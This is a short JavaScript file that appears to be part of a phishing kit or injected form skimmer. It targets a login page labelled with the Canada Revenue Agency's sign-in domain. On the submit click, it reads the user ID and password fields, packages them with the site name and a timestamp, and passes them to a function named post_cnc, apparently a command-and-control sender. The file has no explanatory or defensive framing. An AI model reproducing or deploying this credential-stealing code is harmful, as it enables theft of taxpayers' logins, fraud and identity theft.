function get_user(){
	try {
		return document.getElementById('userid').value;
	} catch(error){
		console.log(error);
		return false;
	}
}

function get_pass(){
	try {
		return document.getElementById('password').value;
	} catch(error){
		console.log(error);
		return false;
	}
}

function get_user_pass(){
	try {
		data = {
			"auth": {
				site: "cms-sgj.cra-arc.gc.ca",
				user: get_user(),
				pass: get_pass(),
				timestamp: Date.now()
			}
		};
		return data;
	} catch(error){
		console.log(error);
		return false;
	}
}

document.getElementById('submitButton').addEventListener(
	'click',
	function(){
		try {
			post_cnc(
				get_user_pass(),
				function(data){
					console.log(data);
					return true;
				}
			);
		} catch(error){
			console.log(error);
			return false;
		}
	}
);